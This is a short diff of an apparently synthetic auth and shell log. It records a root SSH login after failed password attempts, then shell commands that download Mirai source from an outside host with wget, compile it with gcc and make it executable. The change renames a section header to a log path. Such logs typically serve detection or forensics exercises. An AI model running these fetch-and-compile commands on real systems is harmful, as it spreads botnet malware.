@@ -20,7 +20,7 @@ May  5 18:01:12 ubuntu-desktop sshd[3000]: Failed password for root from 198.51.
 May  5 18:01:14 ubuntu-desktop sshd[3000]: Accepted password for root from 198.51.100.202 port 52302 ssh2
 May  5 18:01:15 ubuntu-desktop sshd[3000]: pam_unix(sshd:session): session opened for user root by (uid=0)
 
-# Mirai Payload Execution
+# /var/log/shell.log
 May  5 18:01:16 ubuntu-desktop bash[3010]: cd /tmp && wget http://203.0.113.77/mirai.c -O mirai.c
 May  5 18:01:20 ubuntu-desktop bash[3010]: gcc mirai.c -o mirai
 May  5 18:01:22 ubuntu-desktop bash[3010]: chmod +x mirai
